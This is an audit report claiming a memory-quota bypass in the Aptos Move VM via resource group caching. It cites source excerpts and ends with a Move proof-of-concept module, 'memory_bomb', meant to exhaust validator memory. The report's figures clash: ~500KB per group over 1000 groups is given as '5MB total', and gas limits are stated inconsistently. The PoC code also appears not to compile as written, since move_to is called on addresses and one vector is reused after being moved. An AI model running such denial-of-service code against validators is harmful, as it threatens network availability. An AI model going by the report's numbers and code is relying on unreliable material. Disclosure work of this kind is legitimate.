# Audit Report

## Title
Memory Quota Bypass via Resource Group Cache Accumulation Leading to Validator Node Memory Exhaustion

## Summary
The VM memory quota mechanism fails to track raw serialized bytes stored in the resource group cache, allowing attackers to bypass memory limits and cause validator node memory exhaustion by accessing one small resource from each of many large resource groups.

## Finding Description

The Aptos VM implements a `memory_quota` (10 million abstract value size units) to limit memory consumption during transaction execution. [1](#0-0) 

However, this quota only tracks deserialized Move values in the VM heap, not the raw serialized bytes stored in the resource group cache. [2](#0-1) 

When a resource within a resource group is accessed, the **entire** resource group is loaded into cache as a `BTreeMap<StructTag, Bytes>`, regardless of how many resources were actually accessed: [3](#0-2) 

An attacker can exploit this by:

1. **Setup**: Creating many resource groups (e.g., 1000 groups), each containing multiple large resources totaling ~500KB per group (5MB total)

2. **Attack Transaction**: Submitting a transaction that accesses just ONE small resource (e.g., 1KB) from each group

3. **Memory Quota Bypass**: The VM memory quota only tracks the small deserialized resources (~1MB of VM heap), so the quota check passes

4. **Cache Accumulation**: The resource group cache accumulates the ENTIRE groups (~500MB of raw serialized bytes)

5. **Processing**: When `finish()` is called, `release_resource_group_cache()` drains and processes all this cached data: [4](#0-3) 

6. **Memory Exhaustion**: The validator node experiences memory pressure or exhaustion from holding hundreds of MB of cached data that was never accounted for by the memory quota

The size validation via `check_change_set()` happens AFTER the cache is released and processed, and only applies to write operations (10MB limit), not the read cache: [5](#0-4) 

This breaks the **Move VM Safety** invariant that "bytecode execution must respect memory constraints."

## Impact Explanation

This vulnerability enables a **High Severity** attack per Aptos bug bounty criteria - "Validator node slowdowns."

An attacker can craft transactions that accumulate hundreds of MB of cached resource group data while staying within gas limits and bypassing the VM memory quota. This can cause:

- **Memory exhaustion** on validator nodes, potentially causing crashes or OOM kills
- **Performance degradation** as nodes struggle with memory pressure
- **Consensus impact** if multiple validators are affected simultaneously, slowing block production
- **DoS potential** through repeated exploitation across multiple transactions

While storage limits restrict writes to 1MB per operation and 10MB per transaction [6](#0-5) , there is no equivalent limit on the total size of READ data cached in memory. Gas limits provide only a soft bound - with 2M gas units, an attacker could read hundreds of MB before exhausting gas.

## Likelihood Explanation

**Likelihood: Medium-High**

The attack is feasible because:

1. **No Privilege Required**: Any user can deploy resource groups and submit transactions
2. **Gas Feasibility**: With `storage_io_per_state_byte_read` = 151 internal gas units per byte, reading 500KB per group costs ~77M internal gas units, allowing ~1000 groups within the 2 trillion internal gas limit
3. **Easy Setup**: Attacker just needs to create resource groups with multiple resources and access one from each
4. **Reproducible**: The vulnerability is deterministic and can be triggered repeatedly

The main constraint is gas cost, but this provides sufficient capacity for significant memory accumulation.

## Recommendation

Implement tracking of resource group cache memory usage within the VM memory quota system:

1. **Track Cache Size**: Modify `ResourceGroupAdapter` to track the total byte size of cached resource groups
2. **Charge Memory Quota**: When `load_to_cache()` loads a resource group, charge the memory quota for the raw serialized bytes, not just the deserialized values accessed
3. **Add Early Limits**: Implement an explicit limit on total cached resource group bytes (e.g., 50MB) independent of gas, enforced during `load_to_cache()`
4. **Alternative**: Use the `maybe_resource_group_view` path (GroupSizeKind::AsSum) which doesn't cache data, for all transactions

Example conceptual fix in `resource_group_adapter.rs`:

```rust
fn load_to_cache(&self, group_key: &StateKey) -> PartialVMResult<bool> {
    // Check cache size limit before loading
    let current_cache_bytes: u64 = self.group_cache
        .borrow()
        .values()
        .map(|(btree, _)| btree.values().map(|b| b.len() as u64).sum::<u64>())
        .sum();
    
    if current_cache_bytes > MAX_CACHE_BYTES {
        return Err(PartialVMError::new(StatusCode::MEMORY_LIMIT_EXCEEDED)
            .with_message("Resource group cache size limit exceeded"));
    }
    
    // ... rest of existing load logic ...
}
```

## Proof of Concept

```move
// PoC Move Module
module attacker::memory_bomb {
    use std::vector;
    use aptos_framework::account;
    
    // Create a resource group with 5 large resources
    #[resource_group_member(group = aptos_framework::object::ObjectGroup)]
    struct LargeResource1 has key { data: vector<u8> }
    
    #[resource_group_member(group = aptos_framework::object::ObjectGroup)]
    struct LargeResource2 has key { data: vector<u8> }
    
    #[resource_group_member(group = aptos_framework::object::ObjectGroup)]
    struct LargeResource3 has key { data: vector<u8> }
    
    #[resource_group_member(group = aptos_framework::object::ObjectGroup)]
    struct LargeResource4 has key { data: vector<u8> }
    
    #[resource_group_member(group = aptos_framework::object::ObjectGroup)]
    struct SmallResource has key { value: u64 }
    
    // Setup: Create many resource groups with large + small resources
    public entry fun setup(signer: &signer, num_groups: u64) {
        let i = 0;
        let large_data = vector::empty<u8>();
        vector::resize(&mut large_data, 100000); // 100KB each
        
        while (i < num_groups) {
            let addr = account::create_account_for_test(@attacker);
            move_to(&addr, LargeResource1 { data: large_data });
            move_to(&addr, LargeResource2 { data: large_data });
            move_to(&addr, LargeResource3 { data: large_data });
            move_to(&addr, LargeResource4 { data: large_data });
            move_to(&addr, SmallResource { value: 42 });
            i = i + 1;
        };
    }
    
    // Attack: Access only the small resource from each group
    // This loads ALL resources into cache but only deserializes small ones
    public entry fun attack(addresses: vector<address>) acquires SmallResource {
        let i = 0;
        let len = vector::length(&addresses);
        while (i < len) {
            let addr = *vector::borrow(&addresses, i);
            let _small = borrow_global<SmallResource>(addr);
            // Only the small resource is accessed,
            // but entire group (400KB+) is cached
            i = i + 1;
        };
    }
}
```

The PoC demonstrates that accessing 1000 addresses would cache ~400MB of data while only deserializing ~8KB, bypassing the memory quota and causing memory exhaustion on the validator.

## Notes

This vulnerability exists in the current GroupSizeKind::AsBlob and GroupSizeKind::None modes. The newer GroupSizeKind::AsSum mode with `maybe_resource_group_view` may mitigate this by forwarding to the ResourceGroupView instead of caching, but this is not enabled in all execution paths.

### Citations

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L142-142)
```rust
        [memory_quota: AbstractValueSize, { 1.. => "memory_quota" }, 10_000_000],
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L154-162)
```rust
            max_bytes_per_write_op: NumBytes,
            { 5.. => "max_bytes_per_write_op" },
            1 << 20, // a single state item is 1MB max
        ],
        [
            max_bytes_all_write_ops_per_transaction: NumBytes,
            { 5.. => "max_bytes_all_write_ops_per_transaction" },
            10 << 20, // all write ops from a single transaction are 10MB max
        ],
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L378-398)
```rust
    fn charge_load_resource(
        &mut self,
        addr: AccountAddress,
        ty: impl TypeView,
        val: Option<impl ValueView>,
        bytes_loaded: NumBytes,
    ) -> PartialVMResult<()> {
        if self.feature_version() != 0 {
            // TODO(Gas): Rewrite this in a better way.
            if let Some(val) = &val {
                self.use_heap_memory(
                    self.vm_gas_params()
                        .misc
                        .abs_val
                        .abstract_heap_size(val, self.feature_version())?,
                )?;
            }
        }

        self.base.charge_load_resource(addr, ty, val, bytes_loaded)
    }
```

**File:** aptos-move/aptos-vm-types/src/resource_group_adapter.rs (L164-197)
```rust
    fn load_to_cache(&self, group_key: &StateKey) -> PartialVMResult<bool> {
        let already_cached = self.group_cache.borrow().contains_key(group_key);
        if already_cached {
            return Ok(true);
        }

        let group_data = self.resource_view.get_resource_bytes(group_key, None)?;
        let (group_data, blob_len): (BTreeMap<StructTag, Bytes>, u64) = group_data.map_or_else(
            || Ok::<_, PartialVMError>((BTreeMap::new(), 0)),
            |group_data_blob| {
                let group_data = bcs::from_bytes(&group_data_blob).map_err(|e| {
                    PartialVMError::new(StatusCode::UNEXPECTED_DESERIALIZATION_ERROR).with_message(
                        format!(
                            "Failed to deserialize the resource group at {:? }: {:?}",
                            group_key, e
                        ),
                    )
                })?;
                Ok((group_data, group_data_blob.len() as u64))
            },
        )?;

        let group_size = match self.group_size_kind {
            GroupSizeKind::None => ResourceGroupSize::Concrete(0),
            GroupSizeKind::AsBlob => ResourceGroupSize::Concrete(blob_len),
            GroupSizeKind::AsSum => {
                group_size_as_sum(group_data.iter().map(|(t, v)| (t, v.len())))?
            },
        };
        self.group_cache
            .borrow_mut()
            .insert(group_key.clone(), (group_data, group_size));
        Ok(false)
    }
```

**File:** aptos-move/aptos-vm/src/move_vm_ext/session/mod.rs (L347-351)
```rust
        let mut maybe_resource_group_cache = resolver.release_resource_group_cache().map(|v| {
            v.into_iter()
                .map(|(k, v)| (k, v.into_iter().collect::<BTreeMap<_, _>>()))
                .collect::<BTreeMap<_, _>>()
        });
```

**File:** aptos-move/aptos-vm/src/move_vm_ext/session/user_transaction_sessions/session_change_sets.rs (L28-34)
```rust
    ) -> Result<Self, VMStatus> {
        let user_session_change_set = Self {
            change_set,
            module_write_set,
        };
        change_set_configs.check_change_set(&user_session_change_set)?;
        Ok(user_session_change_set)
```
